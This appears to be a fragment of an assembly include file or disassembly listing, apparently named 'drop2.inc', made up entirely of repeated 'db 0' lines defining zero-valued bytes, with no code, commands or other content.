		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  

ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[drop2.inc]ƒƒƒ
